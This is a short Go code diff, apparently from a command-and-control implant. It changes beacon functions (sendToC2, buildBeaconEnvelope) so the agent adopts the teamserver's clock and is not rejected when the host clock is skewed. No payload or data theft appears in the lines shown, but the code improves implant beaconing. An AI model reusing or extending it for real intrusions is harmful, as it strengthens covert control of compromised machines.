@@ -248,6 +248,12 @@ func sendToC2(idx int, body []byte) []byte {
 	}
 	defer resp.Body.Close()
 
+	// Learn the server clock from every response, including the rejection of a
+	// frame whose timestamp was outside the server's tolerance. This is what
+	// lets a host with a badly skewed clock recover instead of retrying with
+	// the same wrong time forever.
+	noteServerClock(resp.Header)
+
 	lastHTTPStatus.Store(int32(resp.StatusCode))
 	if resp.StatusCode != http.StatusOK {
 		if Debug {
@@ -507,7 +513,10 @@ func buildBeaconEnvelope(body []byte) (sendBody []byte, kind agentFrameKind, seq
 		return nil, 0, 0, false
 	}
 	seq = nextBeaconSeq()
-	ts := time.Now().Unix()
+	// Follow the teamserver's clock when we have learned it (see
+	// agent_clock.go): a host more than five minutes off would otherwise have
+	// every registration/handshake rejected as stale.
+	ts := beaconTimestamp()
 	env := v2Envelope{UUID: agentUUID, Seq: seq, TS: ts}
 
 	seqMu.Lock()
